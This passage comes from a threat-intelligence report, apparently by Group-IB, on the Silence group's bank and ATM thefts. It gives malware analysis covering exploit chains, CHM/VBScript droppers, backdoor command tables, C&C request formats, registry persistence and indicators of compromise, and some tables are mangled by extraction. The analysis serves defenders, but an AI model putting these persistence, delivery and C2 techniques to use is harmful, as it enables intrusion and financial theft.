above-mentioned directory and the terminal\nserver. Below is a chain of events that we have built through incident response.\n\nOn 13.06.2016, the hackers used an administrator account and domain controller\nto install winexesvc service. This service was launched as an OS service from the\nC:\\Windows\\winexesvc.exe file. This service allows remote execution of commands\nlaunched in GNU/Linux systems on computers with Windows using SMB protocol.\nPresumably, the account was compromised using Mimikatz program or its variant,\nalthough there were no signs of its operation.\n\nOn 06.07.07.2016, the criminals attempted to steal money from AWS CBR of\nthe bank. Group-IB experts believe that the attackers experienced a machine\nerror during the processing of a payment batch in AWS CBR with the purpose of\nspoofing the payment details. After this, the bank’s security team tried to stop\nthe second intrusion of the attackers. Despite their attempts, on 19.07.2016, the\nwinexesvc service was repeatedly installed on the servers and workstations. This\ntime, the criminals used a system administrator account.\n\nOn 30.07.2016, the remote control software RAdmin was installed on the server\nwith a directory. The software worked covertly in the svchost.exe file. This\n\n\n-----\n\nsoftware allowed the attacker to have round-the-clock access to the bank’s\nnetwork, because the server was virtual and worked 24\\7.\n\nOn 01.08.2016, the hackers installed the patched backdoor Kikothac, netsrvc32.\nexe, on one of the employee’s computers. This software allowed execution of files\nand commands, received from the C&C server with the following IP: 193.169.245[.]89.\n\nOn 02.08.2016, a piece of software, svchost.exe or RAdmin, was installed on this\nvery PC. The software was not detected by the installed anti-malware solution\nused in the bank. Then, the file for reconciliation of payments (downloaded from\nthe automated banking system with the payments that were to be uploaded\nto AWS CBR) was changed (compromised). AWS CBR was installed by the bank’s\nsecurity team to fight theft.\n\nIn addition, the computer was found to contain mss.exe, which is a\n**Silence.SurveillanceModule, which spies on the user’s desktop. This way, the**\nattackers tried to find out how an operator works to fix their mistakes and\nconduct a fraudulent transaction.\n\nThis theft was prevented because the bank decided to engage Group-IB\ninformation security and incident response experts. Unfortunately, we did not\nmanage to restore the full course of events, because in an attempt to clean the\nnetwork, the bank’s IT team deleted the majority of the attacker’s traces.\n\n\n-----\n\n###### ATMs\n\n\n###### Silence\nMoving into the darkside\n\nMalicious.lnk Malicious.js\n\nOR\nMalicious.doc Malicious.chm\n\n\nSilence Silence Proxy\nSurveilanceModule MainModule Bot\n\nRADMIN dispense ATM\n\nAtmosphere Atmosphere Atmosphere\ncommand\nDropper Injector .dll\n\nMoney\n\nMule\n\nOn 10.08.2017, the bank employee received an email to their corporate mailbox\nfrom josueruvalcaba@mail[.]com with the following subject: \"Message has been\ndisinfected : Double Spending With A Card\". The email contained an attachment\ncalled \"Account Statement.docx\". After opening the attachment, an EPS script was\nlaunched, which exploited two Microsoft Word vulnerabilities, CVE-2017-0262 and\n**CVE-2017-0263. This allowed the attackers to create a backdoor in the system and**\n\n\n-----\n\nescalate privileges. The employee opened the attachment and despite the antimalware solution giving a notification of the successful deletion of malicious files,\nthe Silence loader was launched.\n\nOn 11.08.2017, this workstation was used to scan a local network using Nmap. As\na result, the hackers found vulnerabilities in workstations. The attackers found\nWindows-based nodes which were vulnerable to CVE-2008-4250. The vulnerability\naffects such operating systems as Microsoft Windows 2000 SP4, XP SP2 and SP3,\nServer 2003 SP1 and SP2, Vista Gold and SP1, Server 2008, and 7 Pre-Beta. These\nversions of Windows contain a vulnerability in the server service which allows\nremote code execution. It is caused by incorrect processing of the specially\ncreated RPC requests. With this vulnerability, the attacker might gain full control\nover the system.\n\nExperts identified successful attempts of the anti-malware solution to block the\ndownloading of Meterpreter stagers.\n\n###### http http\n\n## IP\n\n###### http http\n\nOn the same day, a file called m32.exe was created in the file system of the\nworkstation. This file is the Farse utility (a unique Mimikatz-based software\nprogram developed by the attackers), which extracts passwords, hashes and PINs.\nIn addition, the workstation for using AWS CBR was found to launch procdump.exe,\nwhich might have been used to create a copy (dump) of lssas.exe, which, in turn,\ncould be used to extract passwords using Mimikatz.\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\nFrom 11.08.2017 to 14.09.2017, the winexesvc service was created. This service\nallows remote execution of commands launched in GNU/Linux systems, on\ncomputers with Windows using SMB protocol.\n\nOn 07.10.2017, workstations were accessed using standard Microsoft Remote\nDesktop Web Access. That said, there was no data on RDP connections in the\nWindows system logs on this date. It was probably deleted.\n\nAccording to Radmin Server 3 logs, on 08.10.2017, one of the ATMs was remotely\naccessed from a workstation of a bank employee. After this, unique software for\ninteraction with the dispenser was installed.\n\nLater, this software made ATMs withdraw all cash at a specific time. The total\namount stolen was over $100,000.\n\nWhile investigating the network topology, the hackers gained access to a machine\nwith AWS CBR, which is evidenced by the files created on the server. The attackers\ngained access to the machine with a domain administrator account and then\nconnected to it using RAdmin.\n\nDespite the fact that the machine was connected to AWS CBR, the criminals did\nnot use this vector.\n\nIn April 2018, the group withdrew funds again through ATMs. During a single night\nthey siphoned about $150,000. This time, the Atmosphere program was not\nburdened with redundant features and ran stably without bugs.\n\n###### Card Processing\n\n**In 2018, in an attack on another bank, the group used the privileged account of**\na bank employee to change cash withdrawal limits for the previously activated\ncards. Later, the mules used the cards to empty the ATMs. The challenge was that\nthey were cashing out in ATMs of the partner, not the bank itself. The partner’s\nATM had no set limits for withdrawal. The total amount stolen was over $550,000.\n\n\n-----\n\nMalicious.lnk Malicious.js\n\nOR\nMalicious.doc Malicious.chm\n\n\nIncrease card\nlimits\n\n\nСard with no limits\n\nATM Mule\n\n\nSilence.Downloader\n\n\nFarse\n\n\nC&C Server Silence Silence.ProxyBot\nMainModule\n\nDuring the response to this incident, Group-IB experts found a lot of .bat scripts,\nwhich just launched software, cleared logs and generally automated the work. All\nsoftware and scripts were saved in the c:\\intel, c:\\atm, and c:\\1 directories.\n\nFor software debugging, the hackers used legitimate Listdlls and RogueKiller\ntools, and for deleting traces they used sdelete.exe. They also utilized selfdeveloped software for clearing the RAdmin logs.\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\n# TECHNICAL DESCRIPTION  OF THE TOOLS\n\n**This section is devoted to the technical analysis of the software and tools used**\n**by Silence to conduct the attacks. In general, there are five groups that can be**\n**identified:**\n\n1. Unique modifications of exploits used to deliver the backdoor loader of\n**Silence;**\n\n2. Unique Silence Trojan, its spying modules and ProxyBot used to connect\nisolated segments of the target corporate network and C&C server of the\ncriminals. The group also used the patched backdoor Kikothac for some time;\n\n3. Unique set of tools for emptying the ATMs called Atmosphere. It contains the\nsoftware to interact with the dispenser and software to inject a malicious\nlibrary into the dispenser process;\n\n4. Service software, including legitimate administration tools used by the group\nin the attacks.\n\n5. DDoS IRC Bot\n\n###### Attachments\n\n CVE-2017-262 + CVE-2017-263 APT28 related\n\n**File Name** **MD5** **File Description**\n\nContract.docx 57f51443a8d6b8882b0c6af Microsoft Word file exploiting\nbd368e40e CVE-2017-0262 vulnerability.\n\nimage1.eps cf9a68ace36f24b80daf9af EPS file\ne1d7dab44\n\njoiner.dll DLL dropper\n\nx32 version of the exploit of\nCVE-2017-0263 vulnerability\n\nx64 version of the exploit of\nCVE-2017-0263 vulnerability\n\nAfter opening the Contract.docx file from the phishing email, the user will see the\nfollowing text in Russian:\n\n|File Name|MD5|Col3|File Description|\n|---|---|---|---|\n|Contract.docx|57f51443a8d6b88 bd368e40e|82b0c6af|Microsoft Word flie exploiting CVE-2017-0262 vulnerability.|\n|image1.eps|cf9a68ace36f24b e1d7dab44|80daf9af|EPS flie|\n|joiner.dll|||DLL dropper|\n||||x32 version of the exploit of CVE-2017-0263 vulnerability|\n||||x64 version of the exploit of CVE-2017-0263 vulnerability|\n\n\n-----\n\nContract.docx is a .doc file, designed to exploit the CVE-2017-0262 vulnerability\nin Microsoft Word. This file contains an EPS script file image1.eps (7d1c38c3cba\n**1b1ce644d75fa3fd8e65545fdad8b5b21fe630d162cd0bdd87e40). The content**\nwas encrypted using byte-to-byte XOR with a 7a5d5e20 key. Once decrypted,\nit demonstrates code sections with the \"forall\" operator, which indicates the\nexploitation of the above-mentioned vulnerability by incorrect processing of EPS\nfiles, as well as a shellcode in string format (hereinafter Shell1).\n\nIt is interesting to note that the exploit contains variables with names composed\nof lyrics from \"Snuff\" by Slipknot (e.g.You-sold-me-out-to-save-yourself).\n\n**The exploit performs the following actions:**\n\n1. It allocates memory in the Microsoft Word process at the address 0x58a80000\nand writes a shellcode (hereinafter – Shell2) there. This shellcode is required to\nsave and run a backdoor, which is described below. It should be noted that the\nfile is stored inside the shellcode.\n\n2. In the Microsoft Word memory space, a section of the code, which is required to\nunpack the DLL dropper (hereinafter – Shell3), is decrypted. The exports section\nof the DLL contains the \"fork\" function, which is called immediately after\nunpacking. The library name is \"joiner.dll\", SHA256: eea57047413bd7ae6b58e3a\n**3fc4921092920949fd2fd189144ce71d0fa44239d.**\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\n3. The \"fork\" function is used to determine the bit count of the infected system\nand decrypt the module that exploits the CVE-2017-0263 vulnerability. This\nenables the threat actor to gain SYSTEM privileges.\n\n4. The shellcode is called by the address 0x58a80000. This shellcode saves the\n**WINWORD.exe file (c90df05f360fc6566bd226a2e93d91f10e753e3d9bb4a3c**\n**d9e2c7305c80749f3) to the directory \"C:\\Users\\<%username%>\\AppData\\**\n**Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" under the name**\n\"WINWORD.exe\". Following this, this backdoor is executed within the WINWORD.\nexe process. It should be noted that these actions are performed with SYSTEM\nprivileges.\n\nContract.doc\n\nEncrypted\nEPS exploit file\n\nExploit decryption\nand launch\n\nDecrypted\nEPS exploit file\n\nShell1\n\nShell3 is decrypted Shell2 is decrypted\nand written to the address and written to the address\n0x58a80000 0x58a80000\n\nShell3 Shell2\n\nDropper Backdoor\n\nPrivilege escalation, Backdoor is saved\ntransferring control to address to the startup\n0x58a80000 directory and launched\n\nDropper\n\nBackdoor\n\nPrivilege escalation\nmodules\n\nGeneral scheme of infection\n\n\n-----\n\nOn May 9, 2017, ESET published a report on the software tools of the APT28\ngroup (https://www.welivesecurity.com/2017/05/09/sednit-adds-two-zero**day-exploits-using-trumps-attack-syria-decoy/). The approach to infecting**\nthe system and features in the investigated case correspond with the ones in\nthe published report. However, we found key differences, identifying that APT28\nsoftware tools were used by another group to steal money. We noted that in the\ncase described by ESET the control was not given to the 0x58a80000 address.\nAfter investigating the code of both exploits in more detail, we discovered that\nthe code of APT28’s DLL dropper was patched to give control to Shell, which is\nnecessary to save the backdoor in a file and launch it. The modified part of the\ncode is shown in the image below:\n\nPart of the code of the Fork function in the investigated\n(below) and ESET (above) cases\n\nFrom the presented parts of code, it is clear that call and cmp instructions were\nreplaced with nop, push, and retn. Instructions like retn and push need 6 bytes\n(5 and 1 accordingly), while call and cmp need 8 bytes. The two bytes left were\nchanged to nop instruction in the process, which is evidenced by the changes in\ndropper at the level of assembler instructions.\n\n###### CHM\n\n|File Name|MD5|File|Description|\n|---|---|---|---|\n|Letter of Intent.chm|dde658eb388512ee 9f4f31f0f027a7df|CHM VBS|flie downloads and executes remote code when opened|\n|i.vbs||Rem laun|ote VBS code, which downloads and ches the Silence loader|\n|rpc32.exe|404d69c8b74d3755 22b9afe90072a1f4|Silen|ce.Downloader|\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\nOne of the phishing emails contained a help file called Letter of Intent.chm.\n\n**Microsoft Compiled HTML Help is a Microsoft proprietary online help format,**\nconsisting of a collection of HTML pages, an index and other navigation tools. The\nfiles are compressed and deployed in a binary format with the extension .CHM, for\nCompiled HTML. The format is often used for software documentation.\n\nIt was introduced as the successor to Microsoft WinHelp with the release of\nWindows 98 and is still supported in Windows 7. Although the format was\ndesigned by Microsoft, it has been successfully reverse-engineered and is now\nsupported in many document viewer applications.\n\nThis file type is still supported by Microsoft and the software for viewing the help\ncontent is still included in the standard Windows package. This format allows the\nthreat actor to enable JavaScripts and execute remote VBScript and/or Powershell\ncode by calling mshta.exe or powershell.exe.\n\nAlthough the vector is not new and was used even back in 2015 to deliver malware,\nthis method of delivering the files of this type is not at all typical for the CIS and,\nin some cases, helps to evade discovery and successfully pass through corporate\nsecurity systems.\n\nThe Letter of Intent.chm is a compiled HTML file with interactive help. After\ndecompiling, the file has the following structure:\n\nWhen launching the help, the entry point is the file called start.htm. In the body of\nthis HTML file there is an object with interactive content:\n\nAfter opening the help, the VB script is downloaded from the remote server at\n**139.99.156[.]100. The script is then launched with the system interpreter mshta.**\nexe. The VB script, in turn, downloads the Silence.Downloader backdoor, saves it in\n$TEMP%\\rpc32.exe and launches it.\n\n\n-----\n\n###### LNK\n\nThe standard Windows shortcuts (links to files with a .LNK extension) can be used\nto download arbitrary programs and send them specific arguments. At the same\ntime, an attacker can define which icon to display to deceive regular users. Apart\nfrom that, Windows OS does not display a shortcut extension.\n\n```\nstruct LNK {\nstruct ShellLinkHeader sShellLinkHeader;\nstruct LinkTargetIDList sLinkTargetIDList;\nstruct LinkInfo sLinkInfo;\nstruct StringData NAME_STRING;\nstruct StringData RELATIVE_PATH;\nstruct StringData WORKING_DIR;\nstruct StringData COMMAND_LINE_ARGUMENTS;\nstruct StringData ICON_LOCATION;\nstruct ExtraData sExtraData;\n} ;\n\n```\n\n**Shortcut Structure**\n\nWhen the file is formed in a certain way, PowerShell interpreter can be launched\nby sending the prepared script for execution as a parameter.\n\n###### Silence Trojan\n\n**The unique Trojan used by the group is modular. It consists of the following**\n**components (discovered by Group-IB; there could be more):**\n\n- Loader;\n\n- Main module (in the early attacks hackers used a patched backdoor called\n**Kikothac);**\n\n- Module for spying on users;\n\n- Proxy.\n\nThe main module can load any other executable file, which doesn’t limit the\nsystem’s functionality and gives room to extend features.\nNone of the programs are obfuscated.\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\n###### Silence.Downloader\n\n**File Name** **MD5 hash**\n\nWINWORD.exe 5b4417521c71cc89cd3b2fe94ab395b2\n\nIntelSofts_<%disk serial c6c84da4f27103db4ff593f4d4f45d95\nnumber%>.exe\n\nIntel Security.exe b4313151019b2091cbd27c8810e5c7c5\n\nef0fb10c602e3ee81e3677c83a44b409\n\nSecuritySoftWare a58a830dce460e91217328bdefb25cbe\n\na1e210598820cbb08e269b2dfd96e741\n\nrpc32.exe 404d69c8b74d375522b9afe90072a1f4\n\nb09b8be361cd0e30a70cc4603a31d1ee\n\n3345dde0c827dcbda993f7216a8d7c12\n\nfile.exe 43eda1810677afe6791dd7a33eb3d83c\n\n7d3614df9409da3933637f09587af28c\n\n7d8af1f6cf7d08c0c39e03033585d404\n\n9b037ead562c789620a167af85d32f72\n\npripr.exe 97599e2edc7e7025d5c2a7d7a81dac47\n\n**The file WINWORD.exe is a backdoor. The program is designed to download**\n**and launch the Silence’s main Trojan. After launching WINWORD.exe, the Trojan**\n**performs the following activity:**\n\n1. It retrieves the serial number of C://. If unsuccessful, finds out the serial\nnumber of D://. If unsuccessful for the second time, the malware extracts the\nserial number of E://.\n\n2. Then it creates a computable mutex, which is unique for the current machine,\nfor interprocess synchronization.\n\n3. The infinite loop is as follows:\n\n  - the bot sends GET request every 5 seconds to the 158.69.218[.]119/script.\nphp?name=%<disk serial number> server.\n\n  - In response it may receive one of the following commands:\n\n|Silence.Downloader|Col2|Col3|\n|---|---|---|\n|File Name||MD5 hash|\n|WINWORD.exe IntelSofts_<%disk serial number%>.exe|5 c|b4417521c71cc89cd3b2fe94ab395b2 6c84da4f27103db4ff593f4d4f45d95|\n|Intel Security.exe||b4313151019b2091cbd27c8810e5c7c5|\n||e|f0fb10c602e3ee81e3677c83a44b409|\n|SecuritySoftWare|a a|58a830dce460e91217328bdefb25cbe 1e210598820cbb08e269b2dfd96e741|\n|rpc32.exe|4|04d69c8b74d375522b9afe90072a1f4 b09b8be361cd0e30a70cc4603a31d1ee|\n||3|345dde0c827dcbda993f7216a8d7c12|\n|flie.exe|4 7 7 9|3eda1810677afe6791dd7a33eb3d83c d3614df9409da3933637f09587af28c d8af1f6cf7d08c0c39e03033585d404 b037ead562c789620a167af85d32f72|\n|pripr.exe|9|7599e2edc7e7025d5c2a7d7a81dac47|\n\n\n-----\n\n|Command|Description|Col3|\n|---|---|---|\n|fal|The software copies itsel name: IntelSofts_<disk se a value named IntelSofts C:\\ProgramData\\IntelSoft the HKEY_CURRENT_USER CurrentVersion\\Run regis IntelSofts_<disk serial nu|f in C:\\ProgramData under the rial number%>.exe. Then it creates (only if it is not yet present) in s_<disk serial number%>.exe in \\Software\\Microsoft\\Windows\\ try key. Deletes C:\\ProgramData\\ mber%>.exe:Zone.Identifei r\".|\n|DEL|Deletes the above-menti application|oned value and terminates the|\n||http<website address>|Deletes C:\\ProgramData\\ flie with a URL, sent by th on the infected device in exe. After this, it launche CreateProcess() function|MicrosoftsUpdte.exe and downloads a e server. The downloaded flie is saved C:\\ProgramData\\MicrosoftsUpdte. s the downloaded flie either with the or the ShellExecute() function.|\n\n\nIt is worth noting that a copy of this file is also saved in\n**C:\\Users\\<%username%>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\**\n**Programs\\Startup under the name WINWORD.exe. This is a result of the execution**\nof the exploit that installed the software into the system.\n\nWe found several programs of this type at different times. On March 20, 2018, the\nSilence loader, which was compiled on March 2, 2018, was uploaded to VirusTotal.\nThe new version had only minor changes:\n\n1. bot calls GetModuleHandleA(\"kernel32\") function 5555000 times.\n\nThis cycle is designed to hinder dynamic analysis. Other anti-analysis means\nare not present.\n\n2. It retrieves the serial number of C://. If unsuccessful, finds out the serial\nnumber of D://. If unsuccessful for the second time, finds out the serial number\nof E://. If unsuccessful, assigns the variable that stores the serial number\n1110101011.\n\n3. Then it launches an infinite loop of server commands processing and sends\nthe following GET request every 120 seconds: 91.207.7[.]86/I/checkinfo.\nphp?name=<diskphp?name=<disk serial number>\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\n4. Disregarding the result of calling the server, the bot ensures persistence using\none of the following approaches:\n\n  - Creates its own copy in C:\\ProgramData called Intel Security.exe.\n\n  - Creates a value named Intel(R) Common Security and a value of C:\\\nProgramData\\Intel Security.exe (if it is not present) in HKEY_CURRENT_\nUSER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry key.\n\n   - Deletes the copy of the file with postfix :Zone.Identifier in C:\\\nProgramData\"=.\n\n   - In the last version of the bot it did not ensure persistence before receiving\nthe fal command.\n\n5. Following this, the bot processes the response. There are several options of\nresponse:\n\n**Command** **Description**\n\nDEL Deletes the value of the registry described above and\nterminates the application\n\nhttp://<website Deletes C:\\ProgramData\\TEMP-DATA-2-34-56-6-23_<%result\naddress> of multiplication of GUID field structure%>.exe\" and then\ndownloads the file with the URL sent by the server. The\ndownloaded file is then saved to the infected device in\nC:\\ProgramData\\TEMP-DATA-2-34-56-6-23_<%result of\nmultiplication of GUID field structure%>.exe\". After this,\nthe file is launched by the CreateProcess function. The bot\n\"sleeps\" for 2 seconds before the launch.\n\nWe can see that the fal command was deleted and the name of the file where\nSilence will be saved is changed.\n\n###### Patched Kikothac\n\n**File Name** **MD5 hash**\n\nnetsrvc32.exe 9628d7ce2dd26c188e04378d10fb8ef3\n\n0074d8c3183e2b62b85a2b9f71d4ccd8\n\n440b21958ad0e51795796d3c1a72f7b3\n\nb7f97100748857eb75a6558e608b55df\n\nThe software is classified as Backdoor.Kikothac. The application can transfer\ninformation about the infected device, download files, upload files to the C&C\nserver, launch and terminate processes, modify registry entries, and execute\ncommands in the command interpreter. It uses the IP address 46.183.221[.]89 as a\nC&C server. Analysis shows that the application was patched.\n\n|Command|Description|Col3|\n|---|---|---|\n|DEL|Deletes the value terminates the ap|of the registry described above and plication|\n|http://<website address>|Deletes C:\\Progra of multiplication downloads the fli downloaded flie i C:\\ProgramData\\T multiplication of the flie is launche \"sleeps\" for 2 sec|mData\\TEMP-DATA-2-34-56-6-23_<%result of GUID fei ld structure%>.exe\" and then e with the URL sent by the server. The s then saved to the infected device in EMP-DATA-2-34-56-6-23_<%result of GUID fei ld structure%>.exe\". After this, d by the CreateProcess function. The bot onds before the launch.|\n\n|File Name|MD5 hash|Col3|\n|---|---|---|\n|netsrvc32.exe|9628d7ce2dd26c1 0074d8c3183e2b6 440b21958ad0e51|88e04378d10fb8ef3 2b85a2b9f71d4ccd8 795796d3c1a72f7b3|\n||b7f97100748857eb|75a6558e608b55df|\n\n\n-----\n\n**Action Sequence**\n\n- The software uses the SetUnhandledExceptionFilter function to register a\nfunction/high-level handler that terminates the bot in case of any error.\n\n- There are 10 stages in the cycle with a 1-second interval. The software calls a\nmutex named ServiceHelper#56 0.2.21.0001_srv. If there was an error during the\ncall, it tries to create a mutex with this name. If there were no errors 10 times or\nmutex creation was unsuccessful, the application is terminated.\n\n- The software uses the StartServiceCtrlDispatcher() service named Microsoft\nService Watcher in the context of its own process. The process of service\nlaunch:\n\n**All further actions happen in the service handler, namely:**\n\n- The service checks the system time. If it is set to zero, the bot stops working.\n\n- Calls a server with the IP address 46.183.221[.]89. The interaction process can be\ndescribed with the following stages:\n\n   - Lists user accounts in the registry and looks for the ProxyEnable value in\nthe Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings key.\nIn case such field is found, it gets the default proxy server and uses it to\ncommunicate with the C&C server.\n\n   - Reads content of the <%Folder where the bot is located%>\\hostent, where\nthere should be a description/identifier of the bot. After that, it sends the\ncontent to the C&C server. If the file is not present, the service sends the\nfollowing string to the server: \".: No desc :.\".\n\n   - Switches to the cycle of receiving and executing commands of the C&C\nserver.\n\nWhen receiving data from the server, the bot looks for its own commands (you can\nfind the list below). If there were no commands, the bot creates a cmd.exe process\nand sends the resulting string to the C&C server. Some bot commands only launch\nwith parameters. For this, the function/command handler checks the number of\nreceived parameters, where the first parameter is always the command accepted.\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\n\n**Bot Commands:**\n\n|Command|Function|Col3|Possible Responses|Example|\n|---|---|---|---|---|\n|#wput|Get a file from the infected dev command accepts 4–5 paramet namely file name, URL, and por The usage of 5 parameters was discovered.|ice. The ers, t. not|\"OpenReq failed\" – error during operation of HttpOpenRequest function. \"Connect failed\" – error during operation of InternetConnect function. \"InetOpen failed\" – error during operation of InternetOpen function. \"ERR:2\" – error while reading a file. \"ERR:1\" – the number of parameters is not equal to 4 or 5.|#wput localhost 4242 test.txt|\n|#wget|Download the file to an infecte Bot accepts two parameters: U file name. When /d flag is prese nothing. Changes date and tim creation, last access, and last c the date from the similar field dll\".|d device. RL and nt, does e of file hange to \"kernel32.|\"ERR:1\" – the number of parameters is not equal to 3. \"Save/Get failed\" – error while downloading the file. \"Saved\" – the file is downloaded and saved|#wget hххp://www. constitution. org/usdeclar. txt text.txt|\n|#ver|Get the bot version.||\"0.2.21.0001_srv_i86\"|#ver|\n|#p|Refresh time of the last respon the server. The command is me because refreshing is automat happens upon receiving/accep message from the server.|se/call to aningless ed and ting the|No response|#p|\n|#d|Stop the bot from calling the s an hour and stop the cmd.exe launched earlier.|erver for process|No response|#d|\n|#clean|Terminate the cmd.exe process earlier.|launched|No response|#clean|\n|#tl|Get the list of running process|es.|The response is a list of launched processes in the following format: process=<%process_name%> pid=<%PID%> prnt=<%Process PID%> The example of the response is in Annex 1.|#tl|\n|#tk|Terminate the process using it|s PID.|\"ERR:1\" – the number of parameters is not equal to 2. \"Failed to open process, <%PID%>\" – failed attempt to call an application. \"Killed\" – the process is terminated.|#tk 616|\n|#selfpath|Get the path to the module file command does not get the par it responds with the path to th executable file.|. If the ameter, e bot’s|Path to the file. \"ERR:3\" – error while calling a process of the application|#self Kernel32|\n\n\n-----\n\n|#setid|Write a parameter string to <%Path to folder with the bot%>\\hostent. Chang date and time of file creation, last access, and last change of the bot’s file to the date from the similar field \"kernel32.dll\".|e|No response|#setid test_ string|\n|---|---|---|---|---|\n|#ctype|Get information on proxy.||SID=`<%User SID%>`, cstr=`<%CnC%>:<%Port%>` – in case one of the users has a proxy server configured by default. No proxy – if the proxy server is not configured by default for any user of the infected machine.|#ctype|\n|#fsredirect|Enable/disable filesystem redirection.||No response|#fsredirect on #fsredirect off|\n|#ccc|Delete the HKLM\\Software\\ KingKongThai\\cc\\. key from the registr The second transferred parameter should be \"yes\" string.|y.|\"Done.\"|#ccc yes|\n|#cca|Change the value with the name that is received as a parameter in HKLM\\ Software\\KingKongThai\\cc registry ke The value changes to 0.|y.|\"ERR:4_2\" – when addressing the HKLM\\Software\\KingKongThai\\cc key was not successful. \"ERR:4_1\" – if writing a value was unsuccessful. \"Done\" – if successful|cca test_val|\n|#ccd|Delete the value from the HKLM\\ Software\\KingKongThai\\cc\\. registry key. The value name is received as a parameter.||\"ERR:4_2\" – when addressing the HKLM\\Software\\KingKongThai\\cc key was not successful. \"Done\" – if successful.|#ccd test_val|\n|#ccl|Get names of all values in the HKLM\\ Software\\KingKongThai\\cc registry ke|y.|\"ERR:4_1\" – when addressing the HKLM\\Software\\KingKongThai\\cc key was not successful. \"ERR:4_0\" – if an attempt to get information on the registry key was unsuccessful. The data is received in the following format: ----------------- <%value1 name%> <%value2 name%> -----------------|#ccl|\n|#wts_enum|Get the list of launched process sessio using WTS functions.|ns|For examples, refer to Annex 2|#wts_enum|\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\n#wts_start Execute the command. Several strings Command line ‘<%received\nare received as parameters: command%>’ executed. – if\n\nsuccessful.\n\n1) Console – launch on behalf of the\nSystem or any other string; \"ERROR: Failed execute ‘<%received\n\ncommand%>’ <%GetLastError\n\n2) Commands.\n\nresult%>\" – if not successful.\n\n#help No activity performed\n\nAny other Send the string to cmd.exe. Output.\nstring\n\n###### C&C communications\n\nThe bot uses port 80 to communicate with the server. This port sends encrypted\ndata. If the infected device has a proxy server configured by default, the bot uses\nit.\n\nThe bot regularly connects to the C&C server. If the connection is not established\nin 60 minutes, the bot \"snoozes\" for 5 minutes.\n\nThe traffic between the infected machine and the C&C server is encrypted using\na byte-to-byte XOR with a pseudo-random byte generated for each message. The\nmessage structure is as follows:\n```\n struct message {\n   char key;      \n   char unuseful_1; // -1\n   char unuseful_2; // 0\n   int length;\n   char ciphertext[length];\n }\n\n```\n**Changes of C&C IP address in the executable file**\n\nThrough analysis of the bot memory, we discovered, apart from the C&C address,\nthe address 185.29.9[.]45, which is not used by the program anywhere.[R1] In\naddition, both the connectivity function and the standard __NMSG_WRITE\nfunction referred to the C&C address. Having researched other versions of this\nbot, we found an interesting peculiarity. In the investigated sample, the standard\nstring Microsoft Visual C++ Runtime Library was changed to: 46.183.221[.]89\\0 C++\nRuntime Library:\n\n|#wts_start|Execute the command. Several are received as parameters: 1) Console – launch on behalf o System or any other string; 2) Commands.|strings f the|Command line ‘<%received command%>’ executed. – if successful. \"ERROR: Failed execute ‘<%received command%>’ <%GetLastError result%>\" – if not successful.|#wts_start Console cmd. exe ping 127.0.0.1|\n|---|---|---|---|---|\n|#help|No activity performed||||\n|Any other string|Send the string to cmd.exe.||Output.|ipconfig|\n\n\n-----\n\nThe unused address (185.29.9[.]45) is in the same place as in the unchanged\nsamples:\n\nThe string with the IP address of the C&C server of the Silence group is longer\nthan the C&C address in the original file. Therefore, the usual change of the IP\naddress (185.29.9[.]45) in the same place of the executable file leads to incorrect\noperation of the software. This was the reason for changing the Microsoft Visual\nC++ Runtime Library string and not changing the address string from the original\nfile.\n\nThe bot has a relatively simple traffic encryption mechanism, that is why reverse\nengineering of the protocol does not take long. This shows that the sample was\nchanged manually using the regular HEX editor and was not rebuilt for the new\nC&C server.\n\n###### Silence.MainModule\n\n**File Name** **MD5 hash**\n\nMicrosoftUpdte.exe f1954b7034582da44d3f6a160f0a9322\n\nnetsrvc32.exe cfffc5a0e5bdc87ab11b75ec8a6715a4\n\ndwenole.exe c4f18d40b17e506f42f72b8ff111a614\n\nsrv_cons.exe b43f65492f2f374c86998bd8ed39bfdd\n\na3de4a1e5b66d96183ad42800d6be862\n\nThe file in question, MicrosoftUpdte.exe, is classified as Silence.MainModule and\nhas capabilities to execute remote commands covertly, add itself to startup, and\ndownload arbitrary files from the network servers.\n\n**After the launch:**\n\n- The file checks for the following registry keys: \"HKCU\\Software\\Microsoft\\\nWindows\\CurrentVersion\\Run\" and \"HKLM\\Software\\Microsoft\\Windows\\\nCurrentVersion\\Run\". If they are present and there is permission to write in\nthese keys, the file adds itself to startup by writing itself in both keys. The\nrespective registry entries are as follows:\n\n|File Name|MD5 hash|Col3|\n|---|---|---|\n|MicrosoftUpdte.exe|f1954b70345|82da44d3f6a160f0a9322|\n|netsrvc32.exe|cfffc5a0e5b|dc87ab11b75ec8a6715a4|\n|dwenole.exe|c4f18d40b17|e506f42f72b8ff111a614|\n|srv_cons.exe|b43f65492f2|f374c86998bd8ed39bfdd|\n||a3de4a1e5b|66d96183ad42800d6be862|\n\n```\n[HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n\"javaplatform\" = <path_to_exe>\n[HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n\"javaplatform\" = <path_to_exe>\n\n```\n\n-----\n\n###### Silence\nMoving into the darkside\n\nwhere <path_to_exe> is the path to exe where the file was launched. The file is\nnot moved or copied anywhere else (Silence.Downloader loader has already\ndone this during the previous step).\n\n- The bot uses the CreatePipe function to create a pipe, which will be used for\ninterprocess communication with other modules\n\n- After that, the bot remains inactive waiting for further commands from the C&C\nserver.\n\nNetwork communications are performed using unencrypted connections via Http\nland GET requests.\n\n**Possible types of connection to C&C:**\n\n**Type of** **Description** **Example of client**\n**connection** **request to С&C**\n\nConnect1 Registration http://192.168.19[.]171/index.php?xy=1\n\nConnect2 Commands request http://192.168.19[.]171/index.\nphp?xy=2&axy=1234567890\n\nConnect3 Sending return http://192.168.19[.]171/index.php?xy=2&axy=12345\nresults 67890&bxy=aaaaabbbbccc\n\n- The first <request1> request is sent to the C&C server of the following type:\n**http://<cnc>/index.php?xy=1**\nExample of request:\n**\"http://192.168.19[.]171/index.php?xy=1\"**\n\n- As a response to the first request from the client, the C&C server sends a server\nresponse (<response1>), which, according to debugging information in the file, is\nthe identifier of the 